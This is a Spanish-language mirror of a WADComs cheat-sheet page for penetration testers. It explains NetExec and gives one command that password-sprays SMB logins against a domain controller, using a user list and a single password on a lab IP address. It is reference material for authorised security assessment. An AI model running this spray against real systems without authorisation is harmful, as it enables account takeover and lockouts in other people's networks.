# WADComs: NetExec-SMB-Password-Spray

[[00-inicio|Inicio]] · [[Referencias|Referencias]] · [[WADComs|Índice WADComs]]

> Fuente: [https://wadcoms.github.io/](https://wadcoms.github.io/) · Licencia: **GPL-3.0** · Espejo local generado desde el repositorio oficial.

WADComs — comandos para Active Directory, ordenados por lo que TENES.

**Lo que tenés:** `Username`

**Sistema:** `Linux`

## Descripción

"NetExec (a.k.a nxc) is a network service exploitation tool that helps automate assessing the security of large networks." - https://www.netexec.wiki/. This command will perform password spraying over SMB against the domain controller.

Command Reference:

	Domain Controller IP: 10.10.10.1

	Username List: users.txt

	Password: password123

## Comando

```bash
nxc smb 10.10.10.1 -u users.txt -p password123
```

## Referencias

- https://github.com/Pennyw0rth/NetExec
- https://www.netexec.wiki/
